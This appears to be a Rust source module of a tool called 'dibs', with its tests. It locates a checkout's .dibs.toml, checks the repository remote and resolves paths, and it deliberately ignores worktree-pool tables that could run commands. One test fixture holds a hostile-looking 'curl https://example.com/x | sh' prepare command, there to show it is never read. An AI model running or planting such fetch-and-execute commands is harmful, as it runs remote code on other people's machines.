//! A checkout's configuration: the `.dibs.toml` nearest to a directory, the repository of the
//! project it governs, and paths turned into the repository-relative form the server reads.
//!
//! The nearest file wins, and the search never leaves the git repository it starts in: it stops at
//! the first directory holding a `.git` entry (the directory of a clone, or the file of a worktree
//! or a submodule). A checkout nested inside another (a clone the outer one ignores) therefore
//! answers for its own repository, and when it has no file of its own it is governed by none —
//! never by the outer checkout's. A linked worktree is the one exception: one without a file of its
//! own is governed by the file at the top of its repository's main work tree, found by reading
//! git's own files, so every worktree of a checkout — whether git tracks the file or not — belongs
//! to the checkout's project. Its paths are still its own. A file names the server, the project
//! and, in a project with several repositories, which one this checkout is; that repository's
//! remote must be the checkout's `origin`, so a file copied into another clone governs nothing.
//!
//! A file a branch can carry never configures a pool of worktrees: the pool's commands would run
//! on the machine of every member who checks the branch out. A `[worktrees]` or `[pool_worktree]`
//! table found in a `.dibs.toml` is therefore never acted on; the rest of the file still applies,
//! and the checkout says where such a table belongs instead.

use std::fs;
use std::io;
use std::path::{Component, Path, PathBuf};

use serde::Deserialize;
use thiserror::Error;

use dibs_domain::paths::RelPath;
use dibs_domain::project::ProjectSlug;
use dibs_domain::repo::{RemoteUrl, RepoId};
use dibs_domain::settings::{CheckoutRefused, ProjectSettings, RepoSpec};

use crate::api::Me;
use crate::git_dirs::GitDirs;
use crate::paths::{canonical, resolve_existing};
use crate::server_url::ServerUrl;
use crate::worktree_pool::{MARKER_FILE, SETTINGS_FILE, settings_file};

/// The name of a checkout's configuration file.
pub const FILE_NAME: &str = ".dibs.toml";

/// What a `.dibs.toml` says.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CheckoutConfig {
    /// The server.
    pub server: ServerUrl,
    /// The project.
    pub project: ProjectSlug,
    /// Which of the project's repositories this checkout is; absent for a project with one.
    pub repo: Option<RepoId>,
    /// The tables about a pool of worktrees the file holds, which dibs never acts on there.
    pub ignored: Vec<IgnoredTable>,
}

/// A table about a pool of worktrees found in a `.dibs.toml`, where dibs never reads one.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum IgnoredTable {
    /// `[worktrees]`: the pool a checkout lends, which belongs in its git directory.
    Worktrees,
    /// `[pool_worktree]`: the mark of a pool worktree, which dibs keeps in the worktree's git
    /// directory itself.
    PoolWorktree,
}

impl IgnoredTable {
    /// The table as written in the file.
    pub fn header(self) -> &'static str {
        match self {
            Self::Worktrees => "[worktrees]",
            Self::PoolWorktree => "[pool_worktree]",
        }
    }
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct ConfigFile {
    server: String,
    project: String,
    repo: Option<String>,
    worktrees: Option<toml::Value>,
    pool_worktree: Option<toml::Value>,
}

/// A checkout: the directory its paths are relative to, the `.dibs.toml` that governs it, and what
/// the file says. The file lies at the root, except in a linked worktree governed by its main work
/// tree's file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Checkout {
    root: PathBuf,
    file: PathBuf,
    config: CheckoutConfig,
}

/// Why a checkout's configuration cannot be used.
#[derive(Debug, Error)]
pub enum CheckoutError {
    /// The file exists and cannot be read.
    #[error("{path} cannot be read")]
    Unreadable {
        /// The file.
        path: PathBuf,
        /// Why.
        #[source]
        source: io::Error,
    },
    /// The file is not valid.
    #[error("{path} is not valid: {reason}")]
    Invalid {
        /// The file.
        path: PathBuf,
        /// The rule broken.
        reason: String,
    },
}

/// Why a path cannot be checked in this checkout.
#[derive(Debug, Clone, PartialEq, Eq, Error)]
pub enum PathRefused {
    /// The path lies outside the checkout.
    #[error("{path} is outside the checkout at {root}")]
    Outside {
        /// The path as given.
        path: String,
        /// The checkout's root.
        root: String,
    },
    /// The path is the checkout's root itself or breaks the rules of a repository path.
    #[error("{path} is not a file path inside the checkout: {reason}")]
    Invalid {
        /// The path as given.
        path: String,
        /// The rule broken.
        reason: String,
    },
}

/// Why a checkout is governed by no repository of its project's settings.
#[derive(Debug, Clone, PartialEq, Eq, Error)]
pub enum GovernRefused {
    /// The project lists repositories and the file names none.
    #[error(
        "{file} names no repo, and this project has several; add repo = \"<id>\" naming one of: {known}"
    )]
    RepoRequired {
        /// The configuration file.
        file: String,
        /// The repository ids the project lists.
        known: String,
    },
    /// The file names a repository the project does not list.
    #[error("{file} names the repo '{repo}', which this project does not list; it lists: {known}")]
    UnknownRepo {
        /// The configuration file.
        file: String,
        /// The id named.
        repo: RepoId,
        /// The ids listed.
        known: String,
    },
    /// The checkout has no `origin` to compare with the repository's remote.
    #[error(
        "{file} says this checkout is '{repo}' ({expected}), but the checkout has no origin remote to confirm it"
    )]
    NoOrigin {
        /// The configuration file.
        file: String,
        /// The id named.
        repo: RepoId,
        /// The repository's remote.
        expected: RemoteUrl,
    },
    /// The checkout's `origin` is another repository.
    #[error(
        "{file} says this checkout is '{repo}' ({expected}), but its origin is {origin}; the file belongs to another clone"
    )]
    RemoteMismatch {
        /// The configuration file.
        file: String,
        /// The id named.
        repo: RepoId,
        /// The repository's remote.
        expected: RemoteUrl,
        /// The checkout's origin.
        origin: RemoteUrl,
    },
}

/// The token belongs to another project than the checkout names.
#[derive(Debug, Clone, PartialEq, Eq, Error)]
#[error(
    "this checkout belongs to the project '{configured}', but the token signs in to the project '{signed_in}'; sign in to '{configured}' with dibs login"
)]
pub struct ProjectMismatch {
    /// The project the checkout names.
    pub configured: ProjectSlug,
    /// The project the token belongs to.
    pub signed_in: ProjectSlug,
}

impl Checkout {
    /// The checkout whose `.dibs.toml` is nearest to `start`: in `start` itself or the closest
    /// directory above it within the same git repository. The search stops at the first directory
    /// holding a `.git` entry, whether a directory or a file; there a linked worktree without a file
    /// of its own is governed by the file at the top of its main work tree, its root still its own.
    /// `None` when no directory up to there (or up to the root, outside any repository) holds a
    /// configuration file.
    ///
    /// # Errors
    /// [`CheckoutError`] when the file found cannot be read or is not valid.
    pub fn discover(start: &Path) -> Result<Option<Self>, CheckoutError> {
        for directory in start.ancestors() {
            let path = directory.join(FILE_NAME);
            if path.is_file() {
                return Self::read(directory, &path).map(Some);
            }
            let dot_git = directory.join(".git");
            if dot_git.is_file() {
                return Self::governed_by_main(directory);
            }
            if dot_git.exists() {
                return Ok(None);
            }
        }
        Ok(None)
    }

    /// The checkout of the linked worktree at `work_tree`, governed by the file at the top of its
    /// repository's main work tree; `None` when it is no linked worktree, or its main work tree has
    /// no file.
    fn governed_by_main(work_tree: &Path) -> Result<Option<Self>, CheckoutError> {
        let Some(main) = GitDirs::at(work_tree)
            .filter(GitDirs::is_linked)
            .and_then(|dirs| dirs.main_work_tree())
        else {
            return Ok(None);
        };
        let path = main.join(FILE_NAME);
        if !path.is_file() {
            return Ok(None);
        }
        Self::read(work_tree, &path).map(Some)
    }

    /// The checkout at `root` governed by the file at `path`.
    fn read(root: &Path, path: &Path) -> Result<Self, CheckoutError> {
        let text = fs::read_to_string(path).map_err(|source| CheckoutError::Unreadable {
            path: path.to_path_buf(),
            source,
        })?;
        let config = Self::parse(path, &text)?;
        Ok(Self {
            root: root.to_path_buf(),
            file: path.to_path_buf(),
            config,
        })
    }

    /// A checkout at `root`, its file at the root, with this configuration.
    pub fn new(root: PathBuf, config: CheckoutConfig) -> Self {
        let file = root.join(FILE_NAME);
        Self { root, file, config }
    }

    /// Parses the text of the configuration file at `path`. A table about a pool of worktrees is
    /// noted, never read.
    ///
    /// # Errors
    /// [`CheckoutError::Invalid`] naming the file and the first rule broken.
    pub fn parse(path: &Path, text: &str) -> Result<CheckoutConfig, CheckoutError> {
        let invalid = |reason: String| CheckoutError::Invalid {
            path: path.to_path_buf(),
            reason,
        };
        let file: ConfigFile =
            toml::from_str(text).map_err(|error| invalid(error.message().to_owned()))?;
        let server = ServerUrl::parse(&file.server).map_err(|error| invalid(error.to_string()))?;
        let project = ProjectSlug::parse(&file.project)
            .map_err(|error| invalid(format!("project: {error}")))?;
        let repo = file
            .repo
            .as_deref()
            .map(RepoId::parse)
            .transpose()
            .map_err(|error| invalid(format!("repo: {error}")))?;
        let ignored = [
            (file.worktrees.is_some(), IgnoredTable::Worktrees),
            (file.pool_worktree.is_some(), IgnoredTable::PoolWorktree),
        ]
        .into_iter()
        .filter_map(|(present, table)| present.then_some(table))
        .collect();
        Ok(CheckoutConfig {
            server,
            project,
            repo,
            ignored,
        })
    }

    /// The directory the checkout's paths are relative to.
    pub fn root(&self) -> &Path {
        &self.root
    }

    /// The configuration file that governs the checkout.
    pub fn file(&self) -> &Path {
        &self.file
    }

    /// What the file says.
    pub fn config(&self) -> &CheckoutConfig {
        &self.config
    }

    /// The sentence telling the person that the file holds tables about a pool of worktrees,
    /// which dibs never reads from it, and where each belongs; `None` when it holds none.
    pub fn ignored_tables(&self) -> Option<String> {
        if self.config.ignored.is_empty() {
            return None;
        }
        let headers: Vec<&str> = self
            .config
            .ignored
            .iter()
            .map(|table| table.header())
            .collect();
        let dirs = GitDirs::around(&self.root);
        let mut sentence = format!(
            "{} holds {}, which dibs does not read from a .dibs.toml: a command in a file a branch can carry would run on the machine of every member who checks it out.",
            self.file.display(),
            headers.join(" and ")
        );
        if self.config.ignored.contains(&IgnoredTable::Worktrees) {
            let home = dirs.as_ref().map_or_else(
                || format!(".git/{SETTINGS_FILE}"),
                |dirs| settings_file(dirs).display().to_string(),
            );
            sentence.push_str(&format!(
                " Move the [worktrees] table to {home}, a file in the repository's git directory that no branch carries."
            ));
        }
        if self.config.ignored.contains(&IgnoredTable::PoolWorktree) {
            sentence.push_str(&format!(
                " Delete the [pool_worktree] table: dibs marks a pool worktree itself, in {MARKER_FILE} of the worktree's git directory."
            ));
        }
        sentence.push_str(" The rest of the file applies as before.");
        Some(sentence)
    }

    /// Refuses a token of another project than the file names.
    ///
    /// # Errors
    /// [`ProjectMismatch`] naming both projects.
    pub fn verify_project(&self, me: &Me) -> Result<(), ProjectMismatch> {
        verify_project(&self.config.project, me)
    }

    /// The repository of the settings this checkout is, its remote confirmed against the
    /// checkout's `origin` (`None` when it has none). The one repository of a project that lists
    /// none has no remote to confirm.
    ///
    /// # Errors
    /// [`GovernRefused`] naming the file and what does not match.
    pub fn governing_repo<'s>(
        &self,
        settings: &'s ProjectSettings,
        origin: Option<&RemoteUrl>,
    ) -> Result<&'s RepoSpec, GovernRefused> {
        let file = self.file.display().to_string();
        let known = || {
            settings
                .repos()
                .iter()
                .map(|repo| repo.id.to_string())
                .collect::<Vec<_>>()
                .join(", ")
        };
        let repo = settings
            .checkout_repo(self.config.repo.as_ref())
            .map_err(|refused| match refused {
                CheckoutRefused::RepoRequired => GovernRefused::RepoRequired {
                    file: file.clone(),
                    known: known(),
                },
                CheckoutRefused::UnknownRepo { repo } => GovernRefused::UnknownRepo {
                    file: file.clone(),
                    repo,
                    known: known(),
                },
            })?;
        let Some(expected) = &repo.remote else {
            return Ok(repo);
        };
        match origin {
            Some(origin) if origin == expected => Ok(repo),
            Some(origin) => Err(GovernRefused::RemoteMismatch {
                file,
                repo: repo.id.clone(),
                expected: expected.clone(),
                origin: origin.clone(),
            }),
            None => Err(GovernRefused::NoOrigin {
                file,
                repo: repo.id.clone(),
                expected: expected.clone(),
            }),
        }
    }

    /// A path given relative to `cwd`, or absolute, as a path relative to the checkout's root.
    /// The two are compared by their components after `.` and `..` are resolved, so either
    /// separator works; on Windows the drive and the directories down to the root compare without
    /// regard to case, the path inside the checkout with it. When the spelling differs from the
    /// root's (a link in one of them), both are compared as the file system resolves them.
    ///
    /// # Errors
    /// [`PathRefused`] when the path lies outside the checkout or is not a file path.
    pub fn relative_path(&self, cwd: &Path, path: &Path) -> Result<RelPath, PathRefused> {
        let shown = path.display().to_string();
        let absolute = lexical(&cwd.join(path));
        let inside = strip_root(&lexical(&self.root), &absolute).or_else(|| {
            let root = canonical(&self.root).ok()?;
            strip_root(&root, &resolve_existing(&absolute)?)
        });
        let Some(segments) = inside else {
            return Err(PathRefused::Outside {
                path: shown,
                root: self.root.display().to_string(),
            });
        };
        RelPath::parse(&segments.join("/")).map_err(|error| PathRefused::Invalid {
            path: shown,
            reason: error.to_string(),
        })
    }
}

/// Refuses a token of another project than `configured`.
///
/// # Errors
/// [`ProjectMismatch`] naming both projects.
pub fn verify_project(configured: &ProjectSlug, me: &Me) -> Result<(), ProjectMismatch> {
    if me.project.slug == *configured {
        return Ok(());
    }
    Err(ProjectMismatch {
        configured: configured.clone(),
        signed_in: me.project.slug.clone(),
    })
}

/// The path with `.` dropped and each `..` taking off the component before it.
pub(crate) fn lexical(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            Component::CurDir => {}
            Component::ParentDir => {
                out.pop();
            }
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// The components of `path` below `root`, as text, when `path` lies under it.
fn strip_root(root: &Path, path: &Path) -> Option<Vec<String>> {
    let mut root_parts = root.components();
    let mut path_parts = path.components();
    for expected in root_parts.by_ref() {
        let actual = path_parts.next()?;
        if !same_root_component(expected, actual) {
            return None;
        }
    }
    path_parts
        .map(|component| match component {
            Component::Normal(part) => part.to_str().map(str::to_owned),
            _ => None,
        })
        .collect()
}

#[cfg(windows)]
fn same_root_component(a: Component<'_>, b: Component<'_>) -> bool {
    a.as_os_str()
        .to_string_lossy()
        .to_lowercase()
        .replace('/', "\\")
        == b.as_os_str()
            .to_string_lossy()
            .to_lowercase()
            .replace('/', "\\")
}

#[cfg(not(windows))]
fn same_root_component(a: Component<'_>, b: Component<'_>) -> bool {
    a == b
}

#[cfg(test)]
mod tests {
    use dibs_domain::hot_rule::HotRuleRegistry;
    use dibs_domain::settings::SettingsDocument;

    use super::*;
    use crate::api::{Member, ProjectRef};
    use crate::paths::plain;

    fn write(path: &Path, text: &str) {
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, text).unwrap();
    }

    const API: &str = "server = \"https://dibs.example.com\"\nproject = \"acme\"\nrepo = \"api\"\n";

    #[test]
    fn the_nearest_file_wins_for_a_nested_checkout() {
        let dir = tempfile::tempdir().unwrap();
        let outer = dir.path().join("work");
        let inner = outer.join("vendor").join("web");
        write(&outer.join(FILE_NAME), API);
        write(
            &inner.join(FILE_NAME),
            "server = \"https://dibs.example.com/\"\nproject = \"acme\"\nrepo = \"web\"\n",
        );
        fs::create_dir_all(inner.join("src/deep")).unwrap();
        fs::create_dir_all(outer.join("src")).unwrap();

        let found = Checkout::discover(&inner.join("src/deep"))
            .unwrap()
            .unwrap();
        assert_eq!(found.root(), inner);
        assert_eq!(found.config().repo.as_ref().unwrap().as_str(), "web");
        assert_eq!(found.config().server.as_str(), "https://dibs.example.com");

        let outer_found = Checkout::discover(&outer.join("src")).unwrap().unwrap();
        assert_eq!(outer_found.root(), outer);
        assert_eq!(outer_found.config().repo.as_ref().unwrap().as_str(), "api");
    }

    #[test]
    fn the_search_stops_at_the_boundary_of_a_git_repository() {
        let dir = tempfile::tempdir().unwrap();
        let outer = dir.path().join("work");
        write(&outer.join(FILE_NAME), API);
        fs::create_dir_all(outer.join(".git")).unwrap();
        fs::create_dir_all(outer.join("src/deep")).unwrap();

        let plain = Checkout::discover(&outer.join("src/deep"))
            .unwrap()
            .unwrap();
        assert_eq!(plain.root(), outer);

        let bare_clone = outer.join("vendor").join("search");
        fs::create_dir_all(bare_clone.join(".git")).unwrap();
        fs::create_dir_all(bare_clone.join("lib")).unwrap();
        assert!(
            Checkout::discover(&bare_clone.join("lib"))
                .unwrap()
                .is_none()
        );
        assert!(Checkout::discover(&bare_clone).unwrap().is_none());

        let worktree = outer.join("worktrees").join("feature");
        write(
            &worktree.join(".git"),
            "gitdir: ../../.git/worktrees/feature\n",
        );
        fs::create_dir_all(worktree.join("src")).unwrap();
        assert!(Checkout::discover(&worktree.join("src")).unwrap().is_none());

        let configured = outer.join("vendor").join("web");
        fs::create_dir_all(configured.join(".git")).unwrap();
        write(
            &configured.join(FILE_NAME),
            "server = \"https://dibs.example.com\"\nproject = \"acme\"\nrepo = \"web\"\n",
        );
        fs::create_dir_all(configured.join("app")).unwrap();
        let own = Checkout::discover(&configured.join("app"))
            .unwrap()
            .unwrap();
        assert_eq!(own.root(), configured);
        assert_eq!(own.config().repo.as_ref().unwrap().as_str(), "web");
    }

    #[test]
    fn no_file_up_to_the_root_is_no_checkout() {
        let dir = tempfile::tempdir().unwrap();
        assert!(Checkout::discover(dir.path()).unwrap().is_none());
    }

    #[test]
    fn an_invalid_file_names_itself_and_the_rule() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(FILE_NAME);
        for (text, needle) in [
            ("server = \"https://x.example.com\"\n", "project"),
            (
                "server = \"dibs.example.com\"\nproject = \"acme\"\n",
                "not a server address",
            ),
            (
                "server = \"https://x.example.com\"\nproject = \"Acme Co\"\n",
                "project:",
            ),
            (
                "server = \"https://x.example.com\"\nproject = \"acme\"\nrepo = \"a:b\"\n",
                "repo:",
            ),
            (
                "server = \"https://x.example.com\"\nproject = \"acme\"\ntoken = \"x\"\n",
                "token",
            ),
        ] {
            write(&path, text);
            let error = Checkout::discover(dir.path()).unwrap_err().to_string();
            assert!(error.contains(FILE_NAME), "{error}");
            assert!(error.contains(needle), "{text:?}: {error}");
        }
    }

    /// Runs git in `dir`.
    fn git(dir: &Path, args: &[&str]) {
        let status = std::process::Command::new("git")
            .arg("-C")
            .arg(dir)
            .args(args)
            .output()
            .unwrap();
        assert!(
            status.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&status.stderr)
        );
    }

    /// A repository at `<dir>/widgets` with one commit, and its linked worktree at
    /// `<dir>/widgets-worktrees/worktree1`, as git makes them.
    fn repository_with_a_worktree(dir: &Path) -> (PathBuf, PathBuf) {
        let main = fs::canonicalize(dir).unwrap().join("widgets");
        fs::create_dir_all(main.join("src")).unwrap();
        git(&main, &["init", "-q", "-b", "main"]);
        write(&main.join("src/lib.rs"), "\n");
        git(&main, &["add", "-A"]);
        git(
            &main,
            &[
                "-c",
                "user.name=a",
                "-c",
                "user.email=a@example.com",
                "commit",
                "-q",
                "-m",
                "first",
            ],
        );
        let worktree = main.with_file_name("widgets-worktrees").join("worktree1");
        git(
            &main,
            &[
                "worktree",
                "add",
                "-q",
                "--detach",
                &worktree.to_string_lossy(),
                "HEAD",
            ],
        );
        (main, worktree)
    }

    #[test]
    fn a_linked_worktree_without_a_file_is_governed_by_its_main_work_trees_with_its_own_root() {
        let dir = tempfile::tempdir().unwrap();
        let (main, worktree) = repository_with_a_worktree(dir.path());
        assert!(
            Checkout::discover(&worktree.join("src")).unwrap().is_none(),
            "a main work tree without a file governs nothing"
        );
        write(&main.join(FILE_NAME), API);
        let governed = Checkout::discover(&worktree.join("src")).unwrap().unwrap();
        assert_eq!(governed.root(), worktree, "paths are the worktree's own");
        assert_eq!(governed.file(), main.join(FILE_NAME));
        assert_eq!(governed.config().repo.as_ref().unwrap().as_str(), "api");
        assert_eq!(
            governed
                .relative_path(&worktree, Path::new("src/lib.rs"))
                .unwrap()
                .as_str(),
            "src/lib.rs"
        );

        write(
            &worktree.join(FILE_NAME),
            "server = \"https://dibs.example.com\"\nproject = \"acme\"\nrepo = \"web\"\n",
        );
        let own = Checkout::discover(&worktree.join("src")).unwrap().unwrap();
        assert_eq!(own.file(), worktree.join(FILE_NAME), "its own file wins");
        assert_eq!(own.config().repo.as_ref().unwrap().as_str(), "web");
    }

    #[test]
    fn a_submodules_or_a_bare_repositorys_work_tree_borrows_no_file() {
        let dir = tempfile::tempdir().unwrap();
        let root = fs::canonicalize(dir.path()).unwrap();
        let outer = root.join("outer");
        write(&outer.join(FILE_NAME), API);
        write(&outer.join(".git/HEAD"), "ref: refs/heads/main\n");
        write(
            &outer.join(".git/modules/lib/HEAD"),
            "ref: refs/heads/main\n",
        );
        let lib = outer.join("lib");
        write(&lib.join(".git"), "gitdir: ../.git/modules/lib\n");
        fs::create_dir_all(lib.join("src")).unwrap();
        assert!(Checkout::discover(&lib.join("src")).unwrap().is_none());

        let bare = root.join("widgets.git");
        write(&bare.join("config"), "[core]\n\tbare = true\n");
        write(&bare.join("worktrees/second/commondir"), "../..\n");
        write(&root.join(FILE_NAME), API);
        let second = root.join("work/second");
        write(
            &second.join(".git"),
            &format!("gitdir: {}\n", bare.join("worktrees/second").display()),
        );
        assert!(Checkout::discover(&second).unwrap().is_none());
    }

    #[test]
    fn a_pool_table_in_the_file_is_never_read_and_the_rest_of_the_file_governs() {
        let dir = tempfile::tempdir().unwrap();
        let root = fs::canonicalize(dir.path()).unwrap().join("widgets");
        fs::create_dir_all(root.join(".git")).unwrap();
        write(
            &root.join(FILE_NAME),
            &format!(
                "{API}\n[worktrees]\ncount = 3\nprepare = \"curl https://example.com/x | sh\"\nsize = 4\n\n[pool_worktree]\ncheckout = \"/elsewhere\"\n"
            ),
        );
        let checkout = Checkout::discover(&root).unwrap().unwrap();
        assert_eq!(checkout.config().project.as_str(), "acme");
        assert_eq!(checkout.config().repo.as_ref().unwrap().as_str(), "api");
        assert_eq!(
            checkout.config().ignored,
            [IgnoredTable::Worktrees, IgnoredTable::PoolWorktree],
            "noted, never parsed: an unknown key in them breaks nothing"
        );
        let said = checkout.ignored_tables().unwrap();
        for part in [
            "holds [worktrees] and [pool_worktree], which dibs does not read from a .dibs.toml",
            "every member who checks it out",
            &format!(
                "Move the [worktrees] table to {}",
                plain(&root.join(".git").join("dibs").join("worktrees.toml")).display()
            ),
            "Delete the [pool_worktree] table",
            "The rest of the file applies as before.",
        ] {
            assert!(said.contains(part), "missing '{part}' in: {said}");
        }

        write(&root.join(FILE_NAME), API);
        let plain = Checkout::discover(&root).unwrap().unwrap();
        assert!(plain.config().ignored.is_empty());
        assert_eq!(plain.ignored_tables(), None);
    }

    fn settings(document: serde_json::Value) -> ProjectSettings {
        let document: SettingsDocument = serde_json::from_value(document).unwrap();
        ProjectSettings::parse(&document, &HotRuleRegistry::standard()).unwrap()
    }

    fn two_repositories() -> ProjectSettings {
        settings(serde_json::json!({"repos": [
            {"id": "api", "remote": "https://example.com/acme/api.git",
             "areas": [{"name": "billing", "paths": ["src/billing/**"]}]},
            {"id": "web", "remote": "git@example.com:acme/web.git"}
        ]}))
    }

    fn checkout(repo: Option<&str>) -> Checkout {
        Checkout::new(
            PathBuf::from("/work/api"),
            CheckoutConfig {
                server: ServerUrl::parse("https://dibs.example.com").unwrap(),
                project: ProjectSlug::parse("acme").unwrap(),
                repo: repo.map(|id| RepoId::parse(id).unwrap()),
                ignored: Vec::new(),
            },
        )
    }

    fn remote(text: &str) -> RemoteUrl {
        RemoteUrl::parse(text).unwrap()
    }

    #[test]
    fn the_repository_is_confirmed_by_the_checkouts_origin() {
        let settings = two_repositories();
        let api = checkout(Some("api"));
        let origin = remote("git@example.com:acme/api.git");
        assert_eq!(
            api.governing_repo(&settings, Some(&origin))
                .unwrap()
                .id
                .as_str(),
            "api"
        );
        let mismatch = api
            .governing_repo(&settings, Some(&remote("https://example.com/acme/web")))
            .unwrap_err();
        assert!(matches!(mismatch, GovernRefused::RemoteMismatch { .. }));
        let sentence = mismatch.to_string();
        assert!(sentence.contains("example.com/acme/api"), "{sentence}");
        assert!(sentence.contains("example.com/acme/web"), "{sentence}");
        assert!(matches!(
            api.governing_repo(&settings, None),
            Err(GovernRefused::NoOrigin { .. })
        ));
    }

    #[test]
    fn a_missing_or_unknown_repo_is_refused_naming_the_known_ones() {
        let settings = two_repositories();
        let missing = checkout(None).governing_repo(&settings, None).unwrap_err();
        assert!(matches!(missing, GovernRefused::RepoRequired { .. }));
        assert!(missing.to_string().contains("api, web"));
        let unknown = checkout(Some("search"))
            .governing_repo(&settings, None)
            .unwrap_err();
        assert!(matches!(unknown, GovernRefused::UnknownRepo { .. }));
    }

    #[test]
    fn a_project_with_one_repository_needs_no_repo_and_no_origin() {
        let one =
            settings(serde_json::json!({"areas": [{"name": "billing", "paths": ["billing/**"]}]}));
        assert_eq!(
            checkout(None)
                .governing_repo(&one, None)
                .unwrap()
                .id
                .as_str(),
            "default"
        );
    }

    fn me(project: &str) -> Me {
        Me {
            member: Member {
                handle: "alice".parse().unwrap(),
                display_name: "Alice".parse().unwrap(),
                external_login: None,
                role: dibs_domain::member::Role::Member,
            },
            project: ProjectRef {
                slug: ProjectSlug::parse(project).unwrap(),
            },
            repos: Vec::new(),
            settings: SettingsDocument::default(),
        }
    }

    #[test]
    fn a_token_of_another_project_is_refused_naming_both() {
        let api = checkout(Some("api"));
        assert!(api.verify_project(&me("acme")).is_ok());
        let refused = api.verify_project(&me("globex")).unwrap_err();
        let sentence = refused.to_string();
        assert!(
            sentence.contains("'acme'") && sentence.contains("'globex'"),
            "{sentence}"
        );
    }

    #[test]
    fn paths_become_relative_to_the_root_by_components() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("api");
        fs::create_dir_all(root.join("src/billing")).unwrap();
        let checkout = Checkout::new(root.clone(), checkout(Some("api")).config().clone());
        let cwd = root.join("src");
        for (given, expected) in [
            (PathBuf::from("billing/a.rs"), "src/billing/a.rs"),
            (
                PathBuf::from("./billing/../billing/new.rs"),
                "src/billing/new.rs",
            ),
            (PathBuf::from("../Cargo.toml"), "Cargo.toml"),
            (root.join("src/billing/a.rs"), "src/billing/a.rs"),
        ] {
            assert_eq!(
                checkout.relative_path(&cwd, &given).unwrap().as_str(),
                expected,
                "{given:?}"
            );
        }
        assert!(matches!(
            checkout.relative_path(&cwd, Path::new("../../elsewhere.rs")),
            Err(PathRefused::Outside { .. })
        ));
        assert!(matches!(
            checkout.relative_path(&cwd, Path::new("..")),
            Err(PathRefused::Invalid { .. })
        ));
    }

    #[cfg(unix)]
    #[test]
    fn a_path_through_a_link_to_the_checkout_is_inside_it() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("api");
        fs::create_dir_all(root.join("src")).unwrap();
        let link = dir.path().join("link");
        std::os::unix::fs::symlink(&root, &link).unwrap();
        let checkout = Checkout::new(root, checkout(Some("api")).config().clone());
        assert_eq!(
            checkout
                .relative_path(dir.path(), &link.join("src/new.rs"))
                .unwrap()
                .as_str(),
            "src/new.rs"
        );
    }

    #[cfg(windows)]
    #[test]
    fn a_drive_and_its_directories_compare_without_case_and_either_separator() {
        let checkout = Checkout::new(
            PathBuf::from(r"C:\work\api"),
            checkout(Some("api")).config().clone(),
        );
        let cwd = PathBuf::from(r"C:\");
        for given in [
            r"C:\work\api\src\a.rs",
            "c:/work/api/src/a.rs",
            r"c:\WORK\Api\src/a.rs",
        ] {
            assert_eq!(
                checkout
                    .relative_path(&cwd, Path::new(given))
                    .unwrap()
                    .as_str(),
                "src/a.rs",
                "{given}"
            );
        }
        assert_eq!(
            checkout
                .relative_path(&cwd, Path::new(r"C:\work\api\SRC\A.rs"))
                .unwrap()
                .as_str(),
            "SRC/A.rs"
        );
        assert!(
            checkout
                .relative_path(&cwd, Path::new(r"D:\work\api\src\a.rs"))
                .is_err()
        );
    }
}
